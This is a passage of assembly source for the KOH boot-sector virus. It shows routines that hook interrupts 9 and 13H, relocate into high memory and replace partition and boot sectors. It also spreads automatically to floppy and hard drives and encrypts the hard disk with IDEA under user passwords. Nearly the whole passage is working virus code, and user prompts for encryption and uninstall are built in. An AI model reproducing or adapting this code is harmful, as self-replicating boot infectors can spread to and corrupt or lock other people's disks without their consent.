        mov     ax,0300H+VIR_SIZE               ;write VIR_SIZE sectors
        call    DO_INT13E                       ;(int 13H)
IHDR:   mov     BYTE PTR [DR_FLAG],ch
        ret


;*******************************************************************************
;Ask the question in DS:SI and return Z if answer is Y, else return NZ.
ASK:
        push    ax
        call    DISP_STRING
ASKGET: mov     ah,0                            ;get a response
        int     16H
        and     al,0DFH                         ;make upper case
        push    ax
        mov     ah,0EH
        int     10H                             ;display response
        mov     ax,0E0DH
        int     10H
        mov     ax,0E0AH
        int     10H
        pop     ax
        cmp     al,'Y'                          ;set flag
        pop     ax
ASKR:   ret

;This routine is the highest level routine handling hard disk encryption. It
;asks permission to encrypt and then does it to one or two drives, depending
;on how many are present. It uses a separate hard disk password to do the
;encrypting, and this is separate from the floppy disk password entered when
;the drive was originally infected. Return with Z set if successful.
ENCRYPT_HARD_DISK:
        call    CLEAR_SCREEN
        mov     si,OFFSET ENCRYPT_QUERY1
        call    ASK                             ;ask user if he wants hard disk encrypted
        jnz     ASKR
        mov     BYTE PTR [HD_CRYPT],2
EHD1:   mov     si,OFFSET PW_EXPLAIN
        call    DISP_STRING

        mov     di,OFFSET HDKEY                 ;now get random secret key
EHD2:   xor     bx,bx
        mov     cx,16
EHD3:   in      al,40H                          ;read microsecond timer
        xor     ah,ah
        add     bx,ax
        push    bx
        mov     ah,0                            ;get a character
        int     16H
        pop     bx
        xor     ah,ah
        add     bx,ax                           ;add character input
        loop    EHD3
        mov     al,bl
        stosb                                   ;save it for key
        mov     ax,0E2EH                        ;display a '.' to indicate
        int     10H                             ;program is working right
        cmp     di,OFFSET HDKEY + 16
        jnz     EHD2                            ;loop until 16 bytes done

        push    ds                              ;now hash with low memory
        xor     ax,ax                           ;segment 0, for added randomness
        mov     ds,ax
        mov     si,ax
        mov     di,OFFSET HDKEY
        mov     cx,8000H
EHD35:  lodsw
        xor     cs:[di],ax
        add     di,2
        cmp     di,OFFSET HDKEY+16
        jnz     EHD37
        mov     di,OFFSET HDKEY
EHD37:  loop    EHD35
        pop     ds

        mov     si,OFFSET STOP_MSG              ;tell user to stop
        call    DISP_STRING
EHD4:   mov     ah,0
        int     16H
        cmp     al,27                           ;and wait for ESC
        jnz     EHD4

        mov     si,OFFSET FD_PWASK              ;get floppy password
        call    DISP_STRING
        mov     [HPP],OFFSET FDHPP
        call    MASTER_PASS

        mov     si,OFFSET PW_HDEX               ;ok, get the HD password
        call    DISP_STRING
        mov     [HPP],OFFSET HDHPP
        call    MASTER_PASS

        mov     ax,0301H
        mov     bx,OFFSET BOOT_START
        mov     cx,1
        mov     dx,80H
        call    DO_INT13E                       ;write boot sector with updated HD_CRYPT
        call    FD_PW_SAVE                      ;write encryption keys to disk
EHD_SUBR:                                       ;call here from uninstall
        mov     al,80H                          ;start with c: drive
        mov     [CURR_DISK],al                  ;save drive number
        call    ENCRYPT_HARD                    ;and go encrypt it
        xor     al,al                           ;set z for successful returns
EHDR:   ret

;Save floppy disk hashed pass phrase and hard disk key to disk
FD_PW_SAVE:
        push    es
        push    cs
        pop     es
        mov     al,[HD_CRYPT]
        push    ax
        mov     BYTE PTR [HD_CRYPT],2           ;always use strong encryption for this!
        mov     si,OFFSET FDHPP
        mov     di,OFFSET SCRATCHBUF
        mov     cx,16
        rep     movsw                           ;move FDHPP and HDKEY to write
        mov     cl,256-16
        xor     ax,ax
        rep     stosw                           ;clear the rest of this sector
        mov     BYTE PTR [cfb_dc_idea],0
        call    DO_CRYPT
        mov     ax,0301H
        mov     bx,OFFSET SCRATCHBUF
        mov     cl,VIR_SIZE+3
        mov     dx,80H
        call    DO_INT13E                       ;and save it here
        pop     ax
        mov     [HD_CRYPT],al
        pop     es
        ret

DO_CRYPT:
        cld
        mov     [HPP],OFFSET HDHPP              ;only place this gets used
        mov     ax,239BH
        mov     di,OFFSET IV                    ;set up IV to some misc number
        stosw
        inc     ax
        stosw
        inc     ax
        stosw
        inc     ax
        stosw
        call    initkey_idea
        mov     si,OFFSET SCRATCHBUF
        push    si
        call    ideasec                         ;encrypt the buffer
        ret

;This routine installs interrupt 9 and 13 handlers
INSTALL_INT_HANDLERS:
        xor     ax,ax
        mov     ds,ax
        mov     si,9*4
        mov     di,OFFSET OLD_9
        movsw
        movsw
        mov     si,13H*4                        ;save the old int 13H vector
        mov     di,OFFSET OLD_13H
        movsw
        movsw
        mov     ax,OFFSET INT_13H               ;and set up new interrupt 13H
        mov     bx,13H*4                        ;which everybody will have to
        mov     ds:[bx],ax                      ;use from now on
        mov     ax,es
        mov     ds:[bx+2],ax
        mov     bx,9*4
        mov     ds:[bx+2],ax
        mov     ax,OFFSET INT_9
        mov     ds:[bx],ax
        push    cs                              ;bring ds back here
        pop     ds
        ret

;Interrupt 9 handler scans for Ctrl-Alt-K and goes into config routine if
;pressed.
INT_9:
        push    ax
        push    bx
        push    ds
        xor     ax,ax
        mov     ds,ax
        mov     bx,417H
        mov     ax,[bx]
        mov     ah,al
        and     al,4            ;is the CTRL down?
        jz      I9EXIT          ;nope, pass control to bios
        and     ah,8            ;is the ALT down?
        jz      I9EXIT          ;nope, pass control to bios
        push    cs
        pop     ds
        cmp     WORD PTR [ACTIVE],0      ;don't allow recursive activity
        jne     I9EXIT                   ;or activity when FORMAT_FLAG set
        in      al,60H
        cmp     al,24           ;is it an O?
        jz      FD_INFECT_TOGGLE;toggle floppy infect off/on
        cmp     al,35           ;is it an H?
        jz      HD_UNINSTALL
        cmp     al,37           ;is key pressed a K?
        jnz     I9EXIT
        jmp     FD_PASSWORD     ;yes, go change FD Password
I9EXIT: pop     ds
        pop     bx
        pop     ax
        jmp     DWORD PTR cs:[OLD_9]

FD_INFECT_TOGGLE:
        pop     ds
        pop     bx
        call    KEY_RESET               ;go do cleanup chores for system
        pop     ax
        call    SAVE_REGS
        mov     ax,0E07H                ;beep to acknowledge function invocation
        int     10H
        xor     BYTE PTR [FD_INFECT],1        ;toggle the infect flag
        mov     al,'+'
        cmp     BYTE PTR [FD_INFECT],1
        jnz     FDIT1
        mov     al,'-'
FDIT1:  mov     ah,0EH
        int     10H
        cmp     BYTE PTR [DR_FLAG],80H          ;if virus loaded from hard disk
        jne     KBEX                            ;then update change to disk
        mov     ax,201H
        mov     bx,OFFSET SCRATCHBUF
        mov     dx,80H
        mov     cx,1
        call    DO_INT13
        mov     al,[FD_INFECT]
        mov     BYTE PTR [FD_INFECT - OFFSET BOOT_START + OFFSET SCRATCHBUF],al
        mov     ax,301H
        call    DO_INT13
KBEX:   call    REST_REGS
        iret

;Uninstall the virus from the hard disk.
HD_UNINSTALL:
        pop     ds
        pop     bx
        pop     ax
        call    SAVE_REGS
        call    KEY_RESET
        cmp     BYTE PTR [DR_FLAG],80H   ;must have booted from hard drive
        jnz     KBEX
        call    CLEAR_SCREEN
        mov     si,OFFSET SURE  ;make sure before uninstalling
        call    ASK
        jnz     KBEX            ;not sure, continue
        mov     dx,80H
        mov     bx,OFFSET SCRATCHBUF            ;go read original partition sector @
        mov     cx,VIR_SIZE+2                   ;track 0, head 0, sector VIR_SIZE+2
        mov     ax,0201H                        ;BIOS read, for 1 sector
        call    DO_INT13E
        jc      HUR
        mov     si,OFFSET PARTPRE               ;update partition table
        mov     di,OFFSET SCRATCHBUF + 1ADH     ;to current one in viral
        mov     cl,51H                          ;boot sector
        rep     movsb
        mov     ax,0301H
        mov     cl,1                            ;write to true partition sector
        call    DO_INT13E
        jc      HUR
        cmp     BYTE PTR [HD_CRYPT],0           ;is drive encrypted?
        jz      HUR                             ;no, all done
        mov     BYTE PTR [REMOVE],0FFH
        mov     [HPP],OFFSET HDKEY
        call    EHD_SUBR                        ;decrypt the hard disk(s)
        mov     BYTE PTR [REMOVE],0
HUR:    cld
        mov     di,OFFSET INT_13H               ;reroute interrupts
        call    KILL_INT                        ;back to old handlers
        mov     ax,OFFSET OLD_13H
        stosw
        mov     di,OFFSET INT_9
        call    KILL_INT
        mov     ax,OFFSET OLD_9
        stosw
        mov     si,OFFSET ALL_DONE              ;all done, say so
        call    DISP_STRING
        jmp     KBEX

;configuration routine for KOH
FD_PASSWORD:
        pop     ds
        pop     bx
        pop     ax
        call    SAVE_REGS
        call    KEY_RESET
        call    CLEAR_SCREEN
        cmp     BYTE PTR [DR_FLAG],80H  ;change HD PW if it was HD boot
        jnz     FDPW
        cmp     BYTE PTR [HD_CRYPT],2   ;and HD is encrypted
        jnz     FDPW
        mov     si,OFFSET HD_PWCHASK
        call    ASK                     ;and user wants to change it
        jnz     FDPW
        mov     [HPP],OFFSET HDHPP
        call    MASTER_PASS
        call    FD_PW_SAVE
FDPW:   mov     si,OFFSET FD_PWCHASK
        call    ASK
        jnz     KEX
        mov     [HPP],OFFSET FDHPP
        call    MASTER_PASS
        cmp     BYTE PTR [HD_CRYPT],0
        jz      KEX
        call    FD_PW_SAVE
KEX:    jmp     KBEX

KILL_INT:
        mov     ax,0FF2EH
        stosw
        stosb
        ret

;Clean up after receiving a keystroke or you won't be able to get another!
KEY_RESET:
        mov     al,20H                  ;reset 8259 controller
        out     20H,al                  ;for all machines
        mov     ah,0EH
        push    sp                      ;on an 8088 processor?
        pop     ax
        cmp     ax,sp
        je      KRR                     ;no, continue!
        in      al,61H                  ;yes, toggle reset bit
        mov     ah,al
        or      al,80H
        out     61H,al
        mov     al,ah
        out     61H,al
KRR:    ret

;These routines save and restore the registers without clotting up the stack.
SAVE_REGS:
        mov     cs:[REG_BUF],di
        mov     cs:[REG_BUF+2],ax
        mov     ax,es
        mov     cs:[REG_BUF+4],ax
        push    cs
        pop     es
        mov     di,OFFSET REG_BUF+6
        mov     ax,bx
        stosw
        mov     ax,cx
        stosw
        mov     ax,dx
        stosw
        mov     ax,si
        stosw
        mov     ax,ds
        stosw
        mov     ax,cs
        mov     ds,ax
        mov     es,ax
        ret

REST_REGS:
        mov     si,OFFSET REG_BUF
        push    cs
        pop     ds
        lodsw
        mov     di,ax
        lodsw
        push    ax
        lodsw
        mov     es,ax
        lodsw
        mov     bx,ax
        lodsw
        mov     cx,ax
        lodsw
        mov     dx,ax
        pop     ax
        lds     si,[si]
        ret

REG_BUF DW      0,0,0,0,0,0,0,0         ;di,ax,es,bx,cx,dx,si,ds

;This routine clears the screen
CLEAR_SCREEN:
        mov     ax,600H
        xor     cx,cx
        mov     dx,80+25*256
        mov     bh,7
        int     10H
        mov     ah,2
        xor     dx,dx
        mov     bh,0
        int     10H
        ret

;This routine decodes cyl, hd, sec info in dh/cx in standard BIOS format into
;cx=cylinder, dh=head, dl=sector. Only cx and dx are modified.
DECODE_SECTOR:
        push    ax
        mov     al,cl
        and     al,00111111B
        mov     dl,al                   ;put sector # in dl
        mov     al,cl
        mov     cl,6
        shr     al,cl                   ;al has 2 bits of cyl number
        mov     ah,dh
        and     ah,00111111B
        xchg    ah,dh                   ;put head # in dh
        mov     cl,4
        shr     ah,cl
        and     ah,00001100B
        or      ah,al                   ;ah has high 4 bits of cyl number
        mov     cl,ch
        mov     ch,ah                   ;cx = cyl # now
        pop     ax
        ret


;This routine displays the null-terminated string at ds:si
DISP_STRING:
        mov     [RAND_SEED],si
DS1:    call    GET_RANDOM
        mov     al,[si]
        xor     al,ah
        or      al,al
        jz      DSEX
        inc     si
        mov     ah,0EH
        int     10H
        jmp     SHORT DS1
DSEX:   ret

;Strings for the virus go here
SURE            DB      'Sure you want to uninstall? ',0
ENCRYPT_QUERY1  DB      'KOH-Encrypt your HARD DISK now (please backup first)? ',0
PW_EXPLAIN      DB      'Now, enter 2 passwords, 1 for HD, 1 for FD. PWs can be changed with',0DH,0AH
                DB      'Ctrl/Alt-K, C/A-O toggles FD auto-migrate, C/A-H uninstalls on HD.',0DH,0AH
                DB      'Enter HD PW at power up. A cache is recommended for speed!',0DH,0AH,0AH
                DB      'Generating a random number. Press keys SLOWLY until you are asked to stop.',0DH,0AH
                DB      'Begin pressing keys.',0DH,0AH,0
STOP_MSG        DB      7,7,7,7,'OK, stop. Press ESC to continue.',0DH,0AH,0
FD_PWASK        DB      'Enter the FD PW now.',0DH,0AH,0
HD_PWCHASK      DB      'Do you want to change the HD password? ',0
FD_PWCHASK      DB      'Do you want to change the FD password? ',0
PW_HDEX         DB      'Now enter HD PW.',0DH,0AH,0
HARD_ASK        DB      'KOH 1.01-Migrate to hard drive on this computer (please backup)? ',0
ALL_DONE        DB      'Done. You may continue.',0
NO_ROOM         DB      'No room to migrate to HD!',7,0DH,0AH,0
UPDATE_MSG      DB      'Uninstall old version to update to V1.02! Press any key.',0

OLD_SS          DW      ?
OLD_SP          DW      ?
SECS_READ       DB      ?

INCLUDE KOHIDEA.ASM
INCLUDE FATMAN.ASM
INCLUDE PASS.ASM
INCLUDE RAND.ASM

;*******************************************************************************
;* A SCRATCH PAD BUFFER FOR DISK READS AND WRITES                              *
;*******************************************************************************

        ORG     7C00H - 512*BUF_SIZE            ;resides right below boot sector

SCRATCHBUF:
PASSWD:
        DB      PW_LENGTH dup (?)
PASSVR:
        DB      PW_LENGTH dup (?)
        DB      512*BUF_SIZE - 2*PW_LENGTH dup (?)

;These routines share the scratch buffer with disk IO. Be careful!
;PASSWD  EQU     OFFSET SCRATCHBUF
;PASSVR  EQU     OFFSET SCRATCHBUF + PW_LENGTH


;*******************************************************************************
;* THIS IS THE REPLACEMENT (VIRAL) BOOT SECTOR                                 *
;*******************************************************************************

        ORG     7C00H                           ;Starting location for boot sec


BOOT_START:
        jmp     SHORT BOOT                      ;jump over data area
        db      090H                            ;extra byte, used for version control 91H=1.01

BS_ID              DB      'KOHv1.00'      ;identifier for this virus

BS_DATA:

BS_BYTES_PER_SEC   DW      ?               ;bytes per sector
BS_SECS_PER_CLUST  DB      ?               ;sectors per cluster
BS_RESERVED_SECS   DW      ?               ;reserved sectors at beginning of disk
BS_FATS            DB      ?               ;copies of fat on disk
BS_DIR_ENTRIES     DW      ?               ;number of entries in root directory
BS_SECTORS_ON_DISK DW      ?               ;total number of sectors on disk
BS_FORMAT_ID       DB      ?               ;disk format ID
BS_SECS_PER_FAT    DW      ?               ;number of sectors per FAT
BS_SECS_PER_TRACK  DW      ?               ;number of sectors per track (one head)
BS_HEADS           DW      ?               ;number of heads on disk
BS_DBT             DB      25 dup (?)

;The following are the CX and DH values to indicate where the rest of the
;virus is located. These are set by INFECT_FLOPPY, as needed by INT 13H.
VIRCX           DW      ?
VIRDH           DB      ?
HPP             DW      OFFSET FDHPP            ;pointer to hashed pass phrase
BSLOC_DH        DB      ?                       ;active partition boot sector location on hard disk
BSLOC_CX        DW      ?

;The following two bytes must remain contiguous!
CHANGE_FLAG     DB      0                       ;if <> 0, then change line was just called
FD_INFECT       DB      0                       ;if this flag is 1, automatic floppy infect is turned off

;The following two bytes must remain contiguous!
DR_FLAG         DB      ?                       ;drive flag, indicates hard disk boot
HD_CRYPT        DB      ?                       ;Hard disk encryption, 0=OFF, 2=Strong

CRYPT_FLAG      DB      ?                       ;encryption on/off flag for floppy drives (1 bit for each drive)
MOTOR_FLAG      DB      ?                       ;set if motor turned on by Int 13 fctn 16H
REMOVE          DB      0                       ;This flag is FF when uninstalling on hard disk, else 0
FIRST           DB      0                       ;flag to indicate first failure on write-->write protected disk
;The following two bytes must remain contiguous
ACTIVE          DB      1                       ;this is 1 whenever in an int 13 or int 9, and during boot up, helps avoid Ctrl-Alt-KOH when could cause trouble
FORMAT_FLAG     DB      0                       ;flag set when an int 13, fctn 5 is called, overrides motor to infect next read

FIRST_SEC       DB      0                       ;first cyl, hd, sec of
FIRST_HEAD      DB      0                       ;active partition
FIRST_CYL       DW      0
LAST_SEC        DB      0                       ;last cyl, hd, sec of
LAST_HEAD       DB      0                       ;active partition
LAST_CYL        DW      0

;The boot sector code starts here
BOOT:
        cli                                     ;interrupts off
        xor     ax,ax
        mov     ss,ax
        mov     ds,ax
        mov     es,ax                           ;set up segment registers
        mov     sp,OFFSET BOOT_START            ;and stack pointer
        sti

        mov     cl,6                            ;prep to convert kb's to seg
        mov     ax,[MEMSIZE]                    ;get size of memory available
        shl     ax,cl                           ;convert KBytes into a segment
        sub     ax,7E0H                         ;subtract enough so this code
        mov     es,ax                           ;will have the right offset to
        sub     [MEMSIZE],(VIR_SIZE+BUF_SIZE+2)/2  ;go memory resident in high ram

GO_RELOC:
        mov     si,OFFSET BOOT_START            ;set up ds:si and es:di in order
        mov     di,si                           ;to relocate this code
        mov     cx,256                          ;to high memory
        rep     movsw                           ;and go move this sector
        push    es
        mov     ax,OFFSET RELOC
        push    ax                              ;push new far @RELOC onto stack
        retf                                    ;and go there with retf

RELOC:                                          ;now we're in high memory
        push    es                              ;so let's install the virus
        pop     ds
        mov     bx,OFFSET IDEAVIR               ;set up buffer to read virus
        mov     dl,[DR_FLAG]
        mov     dh,[VIRDH]
        mov     cx,[VIRCX]
        mov     si,VIR_SIZE+1                   ;read VIR_SIZE+1 sectors
LOAD1:  push    si
        mov     ax,0201H                        ;read VIR_SIZE+1 sectors
        int     13H                             ;call BIOS to read it
        pop     si
        jc      LOAD1                           ;try again if it fails
        add     bx,512                          ;increment read buffer
        inc     cl                              ;get ready to do next sector--inc sector count
        cmp     cl,BYTE PTR [BS_SECS_PER_TRACK] ;last sector on track?
        jbe     LOAD2                           ;no, continue
        mov     cl,1                            ;yes, set sector=1
        inc     dh                              ;try next side
        cmp     dh,BYTE PTR [BS_HEADS]          ;last side?
        jb      LOAD2                           ;no, continue
        xor     dh,dh                           ;yes, set side=0
        inc     ch                              ;and increment track count
LOAD2:  dec     si
        jnz     LOAD1

MOVE_OLD_BS:
        xor     ax,ax                           ;now move old boot sector into
        mov     es,ax                           ;low memory
        mov     si,OFFSET SCRATCHBUF            ;at 0000:7C00
        mov     di,OFFSET BOOT_START
        mov     cx,1ADH
        rep     movsb
        add     si,OFFSET BOOT_START - OFFSET SCRATCHBUF
        mov     cl,53H                          ;move viral bs partition table
        rep     movsb                           ;into original bs
        push    cs                              ;es=cs
        pop     es

        cli
        mov     ax,cs                           ;move stack up here
        mov     ss,ax
        mov     sp,OFFSET LOCAL_STACK
        sti

        call    INSTALL_INT_HANDLERS            ;install int 9 and 13H handlers

FLOPPY_DISK:                                    ;if loading from a floppy drive,
        call    IS_HARD_THERE                   ;see if a hard disk exists here (this must set cx=0 for below)
        jz      DONE                            ;no hard disk, all done booting

        mov     ax,0201H
        mov     bx,OFFSET SCRATCHBUF            ;read real partition sector
        inc     cx
        mov     dx,80H
        call    DO_INT13E

        mov     si,OFFSET SCRATCHBUF + 1AEH
HDBOOT: add     si,10H                          ;find active boot sector and save its location
        mov     ax,[si]                         ;so it doesn't get encrypted
        cmp     al,80H
        jz      HDB1
        cmp     si,OFFSET SCRATCHBUF + 1EEH
        jnz     HDBOOT
        xor     ax,ax
        mov     [BSLOC_DH],ah
        mov     [BSLOC_CX],ax
        jmp     SHORT DONE
HDB1:   mov     [BSLOC_DH],ah                   ;active partition boot sector
        mov     ax,[si+2]
        mov     [BSLOC_CX],ax
        call    IS_VBS                          ;and see if C: is infected
        jnz     HDB2
        jnc     DONE
        call    UPDATE_HARD
        jmp     SHORT DONE                      ;yes, all done booting
HDB2:   call    INFECT_HARD                     ;else go infect hard drive(s)

DONE:   mov     bx,OFFSET HPP
        mov     [bx],OFFSET FDHPP               ;assume we need a floppy PW only, right now
        cmp     [DR_FLAG],80H                   ;check hard disk encryption scheme
        jnz     DONE4
        mov     [bx],OFFSET HDHPP
        cmp     [HD_CRYPT],0
        jnz     DONE4
        call    ENCRYPT_HARD_DISK               ;if not encrypted, ask to do it now!
        jz      SHORT DONE5                     ;encryption successful, don't need to re-enter pw
        mov     [HPP],OFFSET FDHPP
DONE4:  call    DECRYP_PASS                     ;get decryption password
        cmp     [HPP],OFFSET FDHPP              ;did we get floppy password?
        jz      DONE5                           ;yes, that's it for now
        mov     ax,0201H                        ;no, read FDHPP from disk
        mov     bx,OFFSET SCRATCHBUF
        mov     cx,VIR_SIZE+3
        mov     dx,80H
        call    DO_INT13E
        mov     si,bx                           ;decrypt keys with HDHPP
        mov     BYTE PTR [cfb_dc_idea],0FFH
        call    DO_CRYPT
        mov     si,OFFSET SCRATCHBUF
        mov     di,OFFSET FDHPP
        mov     cx,16
        rep     movsw                           ;and move it to where it belongs

DONE5:
        xor     ax,ax                           ;now go execute old boot sector
        mov     dl,[DR_FLAG]                    ;needed by some partition sectors
        mov     [ACTIVE],al
        push    ax                              ;at 0000:7C00
        mov     ax,OFFSET BOOT_START
        push    ax
        retf

;*******************************************************************************
;This routine determines if a hard drive C: exists, and returns NZ if it does,
;Z if it does not. To save space above, the fact that this routine sets cx=0
;is important.
IS_HARD_THERE:
        push    ds
        xor     cx,cx
        mov     ds,cx
        mov     bx,475H                         ;Get hard disk count from bios
        mov     al,[bx]                         ;put it in al
        pop     ds
        or      al,al                           ;and see if al=0 (no drives)
        ret

;*******************************************************************************
;Determine whether the boot sector in SCRATCHBUF is the viral boot sector.
;Returns Z if it is, NZ if not. It simply compares the BS_ID field with that
;from the virus. Returns C if you have the viral boot sector, but an earlier
;version that needs to be updated.
IS_VBS:
        mov     di,OFFSET BS_ID                 ;set up for a compare
        mov     si,OFFSET SCRATCHBUF+3
        mov     cx,4
        repz    cmpsw                           ;compare 8 bytes
        jnz     IVBSR
        mov     al,BYTE PTR [VER_NO - OFFSET BOOT_START + OFFSET SCRATCHBUF]
        sub     al,1FH
        cmp     al,2                            ;set c if al<1, to indicate update
        xor     al,al                           ;make sure Z is set!
IVBSR:  ret                                     ;and return with z properly set

        ORG     7DACH

VER_NO  DB      2+1FH                           ;Minor version control number 1F= 1.00, 1+1F= 1.01, 2+1F= 1.02

        ORG     7DADH

PARTPRE:DB      11H dup (0)                     ;added info for XTs
PART:   DB      40H dup (0)                     ;partition table goes here

        ORG     7DFEH

        DB      55H,0AAH                        ;boot sector ID goes here

ENDCODE:                                        ;label for the end of boot sec

        ENDS    VIRUS

        END     START
